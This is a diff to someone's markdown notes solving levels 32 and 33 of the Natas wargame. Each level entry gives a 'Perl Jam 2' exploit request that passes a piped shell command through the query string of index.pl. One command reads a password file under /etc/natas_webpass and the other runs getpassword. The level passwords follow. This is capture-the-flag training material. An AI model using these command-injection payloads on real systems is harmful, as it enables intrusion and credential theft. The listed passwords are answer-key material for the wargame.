@@ -107,9 +107,8 @@
 * hay7aecuungiuKaezuathuk9biin0pu1
 
 #### Level32
-* The Perl Jam 2 payload 
->   POST /index.pl?|/bin/cat+/etc/natas_webpass/natas32+| 
-
+* The Perl Jam 2 Vulnerability
+>   POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
 >   -----------------------------416450785040312578442700592
 
 >   Content-Disposition: form-data; name="file";
@@ -118,3 +117,9 @@
 
 >   ARGV
 * no1vohsheCaiv3ieH4em1ahchisainge
+
+#### Level33
+* The Perl Jam 2 Vulnerability 
+>   POST /index.pl?/var/www/natas/natas32/getpassword%20| HTTP/1.1
+* shoogeiGa2yee3de6Aex8uaXeech5eey
+
